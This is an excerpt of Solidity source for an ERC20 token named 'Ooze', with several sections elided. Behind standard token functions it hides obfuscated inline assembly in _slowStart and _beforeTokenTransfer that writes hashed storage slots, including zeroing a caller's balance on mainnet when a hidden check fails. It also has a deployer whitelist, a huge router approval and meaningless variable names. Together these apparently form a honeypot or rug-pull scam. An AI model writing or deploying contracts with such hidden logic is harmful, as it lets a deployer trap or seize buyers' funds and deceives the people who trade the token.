...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addOoze;
    uint256 private slimeAlert = block.number*2;

    mapping (address => bool) private _firstNothing; 
    mapping (address => bool) private _secondSlimy;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private gunShot;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private usFreedom;
    address public pair;
    ...
    bool private trading; uint256 private blackSand = 1; bool private orangeTrump;
    uint256 private _decimals; uint256 private freeAmerica;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addOoze.push(_router); addOoze.push(msgSender_); addOoze.push(pair);
        for (uint256 q=0; q < 3;) {_firstNothing[addOoze[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x4a732877a7461ba0c87cb0bc521db55bb4cb019554912965fdb22ad2d4c7804e
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xa550247a68278c0ea54fb6a40df76b908157306900035816ec179b5feee00570,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; slimeAlert = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addOoze[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployOoze(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addOoze[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployOoze(creator, initialSupply);
    }
}

contract Ooze is ERC20Token {
    constructor() ERC20Token("Ooze", "OOZE", msg.sender, 2500000 * 10 ** 18) {
    }
}